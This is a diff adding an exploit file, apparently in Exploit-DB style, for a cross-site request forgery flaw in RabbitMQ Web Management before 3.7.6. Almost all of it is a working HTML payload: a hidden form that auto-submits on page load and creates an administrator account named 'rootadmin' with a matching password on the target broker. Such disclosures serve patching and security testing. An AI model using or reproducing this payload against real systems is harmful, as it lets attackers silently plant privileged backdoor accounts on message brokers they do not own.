@@ -1,0 +1,24 @@
+# Exploit Title: RabbitMQ Web Management < 3.7.6 - Cross-Site Request Forgery
+# Date: 2018-06-17
+# Author: Dolev Farhi
+# Vendor or Software Link: www.rabbitmq.com
+# Version: 3.7.6
+# Tested on: Ubuntu
+
+<html>  
+<h2>Add RabbitMQ Admin</h2>
+
+<body>
+<form name="rabbit" id="rabbit" action="http://Target/api/users/rootadmin" method="POST">
+<input type="hidden" name="username" value="rootadmin" />
+<input type="hidden" name="password" value="rootadmin" />
+<input type="hidden" name="tags" value="administrator" />
+<input type="submit"  value="save" />
+</form>
+
+<script>
+  window.onload = rabbit.submit()
+</script>
+
+</body>
+</html>
